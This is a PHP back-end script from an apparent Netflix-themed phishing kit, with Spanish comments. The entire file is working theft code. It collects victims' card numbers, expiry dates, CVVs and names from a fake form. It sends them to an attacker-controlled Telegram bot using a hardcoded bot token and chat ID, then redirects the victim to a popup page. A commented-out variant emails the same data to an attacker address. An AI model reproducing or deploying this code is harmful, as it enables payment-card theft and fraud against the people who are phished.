<?php  

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    
    $uno = $_POST["uno"];
    $dos = $_POST["dos"];
    $tres = $_POST["tres"];
    $cuatro = $_POST["cuatro"];
    $cinco = $_POST["cinco"];


    // Token de acceso del bot proporcionado por BotFather
    $botToken = "6330339339:AAEEoaWroxHQ-J8BnFTjKeOFI7cLS6z3P3E";

    // ID de chat del bot. Puedes obtenerlo enviando un mensaje al bot y luego consultando la API de Telegram.
    $chatID = "5635537335";

    // Mensaje que enviarás al bot de Telegram
    $message = "<<** NETFLIX -- L K SH0P T3AM **>>\n\nNumero de tarjeta: $uno\nFecha: $dos\nCVV: $tres\nNombre: $cuatro\nApellido: $cinco\n";

    // URL de la API de Telegram para enviar mensajes
    $telegramAPI = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // Configurar los datos para enviar mediante cURL
    $postData = array(
        "chat_id" => $chatID,
        "text" => $message
    );

    // Inicializar cURL y configurar las opciones
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecutar la solicitud y cerrar cURL
    $response = curl_exec($ch);
    curl_close($ch);

    header('Location:html/popUp.html');

}

//*****************************

// PARA ENVIAR A CORREO 
// Llamando a los campos
//$uno = $_POST['uno'];
//$dos = $_POST['dos'];
//$tres = $_POST['tres'];
//$cuatro = $_POST['cuatro'];
//$cinco = $_POST['cinco'];
//$seis = $_POST['seis'];

// Datos para el correo
//$destinatario = "AQUIVATUCORREO@gmail.com";
//$asunto = "Ya callo el Codigo !!";

//$carta = "1: $uno \n";
//$carta .= "2: $dos \n";
//$carta .= "3: $tres \n";
//$carta .= "4: $cuatro \n";
//$carta .= "5: $cinco \n";
//$carta .= "6: $seis";

// Enviando Mensaje
//mail($destinatario, $asunto, $carta);
//header('Location:html/popUp.html');

?>